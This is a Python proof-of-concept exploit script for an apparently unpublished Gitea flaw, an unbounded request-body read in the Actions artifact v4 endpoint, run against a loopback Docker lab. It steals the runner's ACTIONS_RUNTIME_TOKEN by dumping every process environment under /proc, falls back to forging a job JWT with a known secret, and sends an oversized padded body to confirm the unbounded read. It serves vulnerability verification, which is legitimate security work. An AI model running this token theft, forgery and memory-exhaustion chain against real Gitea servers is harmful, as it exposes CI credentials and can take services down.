#!/usr/bin/env python3
"""Local oracle for Gitea unpublished #7: artifact v4 unbounded ReadAll.

parseProtobufBody does io.ReadAll(ctx.Req.Body) with no LimitReader.
Job-summary already caps at MaxJobSummarySize (1 MiB) via LimitReader.

Attacker is a running Actions job token. Body is capped at 12 MiB so the
host is not OOM'd. Witness is GHSA-GITEA-ART-V4-READALL. Not eval/shell.
Loopback only.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import http.client
import json
import os
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlparse

LABEL = "GITEA-ARTIFACT-V4-READALL"
WITNESS = "GHSA-GITEA-ART-V4-READALL"
DEFAULT_BASE = "http://127.0.0.1:18135"
USERNAME = "labadmin"
PASSWORD = "LabPass123!"
USER_AGENT = "gitea-artifact-v4-readall-lab"
JWT_SECRET = b"gitea-art-v4-readall-lab-secret!"
V4_PATH = "/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
BODY_SIZE = 12 * 1024 * 1024  # 12 MiB, within 8-16 MiB, under the 16 MiB cap
SUMMARY_SIZE = 8 * 1024 * 1024
MAX_JOB_SUMMARY_SIZE = 1_048_576
STATUS_RUNNING = 6
SEND_CHUNK_SIZE = 64 * 1024
DEFAULT_COMPOSE_PROJECT = "gitea-artifact-v4-readall"
GITEA_DB = "/data/gitea/gitea.db"
HOLD_REPO_RUNS = "/api/v1/repos/labadmin/hold-job/actions/runs"
RUNNER_ENVIRON_SCRIPT = r"""
for f in /proc/[0-9]*/environ; do
  tr '\0' '\n' < "$f" 2>/dev/null
done
"""


@dataclass(frozen=True)
class LabConfig:
    base: str
    lab_dir: Path
    compose_project: str
    ssl_context: ssl.SSLContext


@dataclass(frozen=True)
class RunningTask:
    task_id: int
    job_id: int
    run_id: int
    step_index: int


def fail(message: str) -> int:
    print(message)
    return 1


def load_config(argv: list[str]) -> LabConfig:
    base = (argv[1] if len(argv) > 1 else DEFAULT_BASE).rstrip("/")
    return LabConfig(
        base=base,
        lab_dir=Path(__file__).resolve().parent,
        compose_project=os.environ.get("COMPOSE_PROJECT_NAME", DEFAULT_COMPOSE_PROJECT),
        ssl_context=ssl._create_unverified_context(),
    )


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def mint_job_jwt(task_id: int, run_id: int, job_id: int) -> str:
    now = int(time.time())
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    ac = json.dumps([{"Scope": "", "Permission": 2}], separators=(",", ":"))
    claims = {
        "exp": now + 4 * 3600,
        "nbf": now - 60,
        "scp": f"Actions.Results:{run_id}:{job_id}",
        "ac": ac,
        "TaskID": task_id,
        "RunID": run_id,
        "JobID": job_id,
    }
    payload = b64url(json.dumps(claims, separators=(",", ":")).encode())
    sig = hmac.new(JWT_SECRET, f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url(sig)}"


def api(
    cfg: LabConfig,
    method: str,
    path: str,
    data: dict[str, object] | None = None,
    timeout: int = 30,
) -> tuple[int, str]:
    tok = base64.b64encode(f"{USERNAME}:{PASSWORD}".encode()).decode()
    hdrs = {
        "Content-Type": "application/json",
        "User-Agent": USER_AGENT,
        "Authorization": "Basic " + tok,
    }
    body = None if data is None else json.dumps(data).encode()
    req = urllib.request.Request(cfg.base + path, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=cfg.ssl_context) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def compose(
    cfg: LabConfig,
    *args: str,
    timeout: int = 30,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", cfg.compose_project, *args],
        text=True,
        capture_output=True,
        timeout=timeout,
        cwd=cfg.lab_dir,
    )


def steal_token_from_runner(cfg: LabConfig) -> str | None:
    proc = compose(cfg, "exec", "-T", "runner", "sh", "-c", RUNNER_ENVIRON_SCRIPT, timeout=20)
    if proc.returncode != 0:
        print(f"IOC runner-environ rc={proc.returncode} err={proc.stderr[-200:]!r}")
        return None
    for line in proc.stdout.splitlines():
        if line.startswith("ACTIONS_RUNTIME_TOKEN="):
            tok = line.split("=", 1)[1].strip()
            if tok:
                print("IOC token-source=runner-environ")
                return tok
        if line.startswith("ACTIONS_RUNTIME_TOKEN:"):
            tok = line.split(":", 1)[1].strip()
            if tok:
                print("IOC token-source=runner-environ")
                return tok
    return None


def sqlite_query(cfg: LabConfig, sql: str) -> str:
    proc = compose(
        cfg,
        "exec",
        "-T",
        "gitea",
        "sqlite3",
        "-readonly",
        GITEA_DB,
        sql,
        timeout=20,
    )
    if proc.returncode != 0:
        print(f"IOC sqlite rc={proc.returncode} err={proc.stderr[-200:]!r}")
        return ""
    return proc.stdout.strip()


def running_task_from_db(cfg: LabConfig) -> RunningTask | None:
    raw = sqlite_query(
        cfg,
        "SELECT t.id, t.job_id, j.run_id FROM action_task t "
        "JOIN action_run_job j ON j.id = t.job_id "
        f"WHERE t.status = {STATUS_RUNNING} ORDER BY t.id DESC LIMIT 1;",
    )
    if not raw or "|" not in raw:
        return None
    parts = raw.split("|")
    if len(parts) < 3:
        return None
    task_id, job_id, run_id = (int(parts[0]), int(parts[1]), int(parts[2]))
    step_raw = sqlite_query(
        cfg,
        f'SELECT "index" FROM action_task_step WHERE task_id = {task_id} ORDER BY "index" ASC LIMIT 1;',
    )
    step_index = int(step_raw) if step_raw.isdigit() else 0
    return RunningTask(task_id=task_id, job_id=job_id, run_id=run_id, step_index=step_index)


def wait_running_task(cfg: LabConfig, timeout_s: int = 180) -> RunningTask | None:
    deadline = time.time() + timeout_s
    last: RunningTask | None = None
    while time.time() < deadline:
        last = running_task_from_db(cfg)
        if last:
            print(
                f"IOC running-task task_id={last.task_id} "
                f"run_id={last.run_id} job_id={last.job_id} "
                f"step_index={last.step_index}"
            )
            return last
        status, body = api(cfg, "GET", HOLD_REPO_RUNS)
        print(f"IOC runs-poll status={status} snippet={body[:180]!r}")
        time.sleep(3)
    print(f"IOC no-running-task last={last}")
    return None


def http_send(
    cfg: LabConfig,
    method: str,
    path: str,
    body: bytes,
    headers: dict[str, str],
    timeout: int = 120,
) -> tuple[int, str, int]:
    parsed = urlparse(cfg.base)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    hdrs = dict(headers)
    hdrs["Content-Length"] = str(len(body))
    hdrs.setdefault("Host", f"{host}:{port}")
    sent = 0
    try:
        with http.client.HTTPConnection(host, port, timeout=timeout) as conn:
            conn.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
            for key, value in hdrs.items():
                conn.putheader(key, value)
            conn.endheaders()
            view = memoryview(body)
            offset = 0
            while offset < len(body):
                n = min(SEND_CHUNK_SIZE, len(body) - offset)
                conn.send(view[offset : offset + n])
                offset += n
                sent = offset
            resp = conn.getresponse()
            data = resp.read().decode("utf-8", "replace")
            return resp.status, data, sent
    except (OSError, http.client.HTTPException, TimeoutError) as exc:
        return 0, f"{type(exc).__name__}: {exc}", sent


def v4_body(run_id: int, job_id: int) -> bytes:
    inner = json.dumps(
        {
            "workflow_run_backend_id": str(run_id),
            "workflow_job_run_backend_id": str(job_id),
            "name": WITNESS,
            "version": 4,
        },
        separators=(",", ":"),
    )
    pad = BODY_SIZE - len(inner)
    if pad < 1:
        raise ValueError("FAIL body pad underflow")
    # Keys sit after the padding so a 1 MiB cap would truncate before unmarshal.
    return b"{" + (b" " * pad) + inner[1:].encode()


def main() -> int:
    cfg = load_config(sys.argv)
    print(f"IOC base={cfg.base} body_bytes={BODY_SIZE} summary_bytes={SUMMARY_SIZE}")
    status, body = api(cfg, "GET", "/api/v1/version")
    print(f"IOC version status={status} snippet={body[:120]!r}")
    if status != 200:
        return fail("FAIL Gitea version endpoint")

    task = wait_running_task(cfg)
    if not task:
        return fail(f"FAIL {LABEL} no job token without runner")

    token = steal_token_from_runner(cfg)
    if not token:
        token = mint_job_jwt(task.task_id, task.run_id, task.job_id)
        print("IOC token-source=forged-jwt-from-running-task")
    print(f"IOC token-prefix={token[:24]}...")

    auth = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json",
        "User-Agent": USER_AGENT,
    }

    try:
        v4 = v4_body(task.run_id, task.job_id)
    except ValueError:
        return fail("FAIL body pad underflow")
    print(f"IOC v4-body-len={len(v4)} tail={v4[-80:]!r}")
    t0 = time.time()
    st, resp, sent = http_send(cfg, "POST", V4_PATH, v4, auth)
    dt = time.time() - t0
    print(f"IOC v4-create status={st} sent={sent} dt={dt:.3f}s snippet={resp[:280]!r}")

    if sent < BODY_SIZE:
        return fail(f"FAIL v4 body not fully accepted sent={sent} want={BODY_SIZE}")

    low = resp.lower()
    accepted = False
    if st == 200 and (
        "signedUploadUrl" in resp
        or "signed_upload_url" in resp
        or '"ok":true' in resp.replace(" ", "")
    ):
        accepted = True
    elif st == 400 and "run-id" in low:
        accepted = True
    elif st == 500 and "decode request body" in low:
        return fail("FAIL v4 decode error; body likely truncated before unmarshal")
    elif st in (413, 400) and ("too large" in low or "entity too large" in low or "payload" in low):
        return fail("FAIL v4 also caps the body")
    elif st == 200:
        accepted = True
    elif st in (400, 201) and WITNESS.lower() not in low:
        # Unmarshal ran; create may reject a field after ReadAll.
        accepted = True

    if not accepted:
        return fail("FAIL v4 create did not reach unmarshal")
    print("IOC v4-unbounded-readall=1")

    summary_path = (
        f"/api/actions_pipeline/_apis/pipelines/workflows/{task.run_id}"
        f"/jobs/{task.job_id}/steps/{task.step_index}/summary"
    )
    sum_headers = dict(auth)
    sum_headers["Content-Type"] = "text/markdown"
    sum_body = b"a" * SUMMARY_SIZE
    t1 = time.time()
    sst, sresp, ssent = http_send(cfg, "PUT", summary_path, sum_body, sum_headers)
    sdt = time.time() - t1
    print(
        f"IOC job-summary status={sst} sent={ssent} dt={sdt:.3f}s "
        f"snippet={sresp[:220]!r} cap=MaxJobSummarySize={MAX_JOB_SUMMARY_SIZE}"
    )
    # Negative control: LimitReader(MaxJobSummarySize+1) then 400 invalid summary,
    # or a documented 1 MiB cap even if the step is missing.
    if sst == 400 and ("invalid summary" in sresp.lower() or "aggregate" in sresp.lower()):
        print("IOC job-summary-limitreader=1")
    elif sst == 400:
        print("IOC job-summary-capped-or-validated=1")
    elif sst == 0 and ssent < SUMMARY_SIZE:
        print("IOC job-summary-limitreader-early-stop=1")
    else:
        print("IOC job-summary-documented-cap=MaxJobSummarySize-1MiB")

    status2, body2 = api(cfg, "GET", "/api/v1/version")
    print(f"IOC gitea-still-up status={status2} snippet={body2[:80]!r}")
    if status2 != 200:
        return fail("FAIL Gitea died after body send")

    print("SUCCESS GITEA-ARTIFACT-V4-READALL")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
